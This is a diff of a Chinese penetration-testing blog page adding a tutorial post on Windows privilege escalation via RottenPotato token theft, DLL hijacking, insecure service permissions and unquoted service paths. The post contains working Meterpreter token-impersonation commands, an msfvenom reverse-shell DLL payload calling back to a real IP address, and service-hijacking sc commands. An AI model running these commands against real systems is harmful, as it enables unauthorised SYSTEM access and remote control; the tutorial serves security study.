@@ -612,6 +612,128 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="雨雾">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cr's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86&dll%E5%8A%AB%E6%8C%81&%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84&%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90/" class="post-title-link" itemprop="url">权限提升-烂土豆&dll劫持&引号路径&服务权限</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-09 15:31:08" itemprop="dateCreated datePublished" datetime="2021-10-09T15:31:08+08:00">2021-10-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-13 15:30:46" itemprop="dateModified" datetime="2021-10-13T15:30:46+08:00">2021-10-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" itemprop="url" rel="index"><span itemprop="name">权限提升</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">小迪安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>RottenPotato(烂土豆)提权的原理简述如下：</strong></p>
+<ol>
+<li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端</li>
+<li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li>
+<li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li>
+</ol>
+<p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户和账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。<br /><br><br />烂土豆比热土豆的优点是：</p>
+<ol>
+<li>100%可靠</li>
+<li>（当时）全版本通杀</li>
+<li>立即生效，不用像hot potato那样有时候需要等Windows更新才能使用</li>
+</ol>
+<p>总之，我对这个的理解是通过中间人攻击，将COM(NT\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。<br /><br><br />必备知识点：<br /> #令牌窃取配合烂土豆提权 单纯令牌窃取：Web 权限或本地提权 如配合烂土豆提权：Web 或数据库等权限 #不带引号服务路径安全问题 服务路径提权：Web 权限或本地提权<br /> #不安全的服务权限配置问题 服务权限配置：Web 权限或本地提权(Web 几率小)<br /> #补充说明：dll 劫持提权及 AlwaysInstallElevated 等说明 dll 劫持提权需要特定软件应用的控制权限及启用配合，复杂鸡肋 AlwaysInstallElevated 提权默认禁用配置，利用成功机会很少<br /><br><br /><strong>#案例1.Win2012-烂土豆配合令牌窃取提权-Web权限</strong><br /><strong>原理：参考上述内容，非服务类用户无法窃取成功</strong><br />过程：上传烂土豆-执行烂土豆-利用窃取模块-窃取SYSTEM-成功<br />实现：web权限-通过烂土豆配合令牌-获取SYSTEM</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">《MSF操作》</span><br><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>#案例2.Wind2012-DLL劫持提权应用配合MSF-web权限</strong><br />原理：Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过在应用程序要查找的 位置放置恶意 DLL 来提权。通常，Windows 应用程序有其预定义好的搜索 DLL 的路径，它会根据下 面的顺序进行搜索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、应用程序加载的目录</span><br><span class="line">2、C:\Windows\System32</span><br><span class="line">3、C:\Windows\System</span><br><span class="line">4、C:\Windows</span><br><span class="line">5、当前工作目录 Current Working Directory，CWD</span><br><span class="line">6、在 PATH 环境变量的目录（先系统后用户）</span><br><span class="line"></span><br><span class="line">过程：信息收集（第三方软件）-进程调试（本地调试）-制作 dll 并上传-替换 dll-启动应用后成功</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e85ea697d44718541afbfbe8c7c3f4b3.png" alt="image.png"></p>
+<p><strong>​</strong></p>
+<p><strong>#案例3.Win2012-不安全的服务权限配合MSF-本地权限</strong><br /><strong>​</strong></p>
+<p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有 过多的权限，例如，可以直接修改它导致重定向执行文件。 过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; *	#微软官方工具</span><br><span class="line">accesschk.exe -uwcqv &quot;users&quot; *</span><br><span class="line">sc config &quot;NewServiceName&quot; binpath=&quot;C:\Program.exe&quot;</span><br><span class="line">sc start &quot;NewServiceName&quot;</span><br></pre></td></tr></table></figure>
+
+<p><br /><strong>#案例4.Win2012-不带引号服务路径配合MSF-Web，本地权限</strong><br />原理：当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系 统将会执行找到的空格分隔的服务路径的第一个实例。<br />过程：检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0cb43a58d26e2d56446cfa9e2023d543.png" alt="image.png"><br> /i /v “””</p>
+<pre><code>[外链图片转存中...(img-9Eha8Un1-1634110127895)]
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://coldrainh.github.io/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -897,7 +1019,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -938,7 +1060,7 @@
           <h3 class="widget-title">Tag Cloud</h3>
         <div id="myCanvasContainer" class="widget tagcloud">
             <canvas width="250" height="250" id="resCanvas" style="width=100%">
-                <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xray/" rel="tag">xray</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/" rel="tag">个人介绍</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/" rel="tag">小迪安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" rel="tag">渗透测试工具</a><span class="tag-list-count">1</span></li></ul>
+                <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xray/" rel="tag">xray</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/" rel="tag">个人介绍</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/" rel="tag">小迪安全</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" rel="tag">渗透测试工具</a><span class="tag-list-count">1</span></li></ul>
             </canvas>
         </div>
         </div>
@@ -970,12 +1092,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">4k</span>
+    <span title="站点总字数">6k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4 分钟</span>
+    <span title="站点阅读时长">5 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
